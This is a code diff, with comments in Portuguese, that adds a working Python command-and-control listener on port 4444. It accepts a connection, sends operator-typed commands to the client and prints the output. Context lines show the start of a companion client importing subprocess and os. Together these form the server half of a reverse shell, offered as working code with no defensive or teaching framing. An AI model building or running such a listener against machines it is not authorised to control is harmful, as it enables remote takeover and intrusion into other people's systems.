@@ -1,4 +1,50 @@
 
+
+
+
+import socket
+
+# Configuração do servidor
+SERVER_HOST = '0.0.0.0'  # Aceita conexões de qualquer IP
+SERVER_PORT = 4444
+
+# Criando o socket do servidor
+servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+servidor.bind((SERVER_HOST, SERVER_PORT))
+servidor.listen(5)  # Permite até 5 conexões pendentes
+
+print(f"Servidor escutando em {SERVER_HOST}:{SERVER_PORT}...")
+
+while True:
+    cliente, endereco = servidor.accept()
+    print(f"Cliente conectado: {endereco}")
+
+    while True:
+        try:
+            # Entra com o comando
+            comando = input("Comando> ").strip()
+            
+            if not comando:
+                continue
+            
+            # Enviar comando para o cliente
+            cliente.send(comando.encode())
+
+            if comando.lower() == "exit":
+                cliente.close()
+                break
+
+            # Recebe a resposta do cliente
+            resposta = cliente.recv(4096).decode(errors="ignore")
+            print(f"\n{resposta}\n")
+
+        except (ConnectionResetError, ConnectionAbortedError):
+            print("Cliente desconectado.")
+            break
+
+    cliente.close()
+
+
 import socket
 import subprocess
 import os
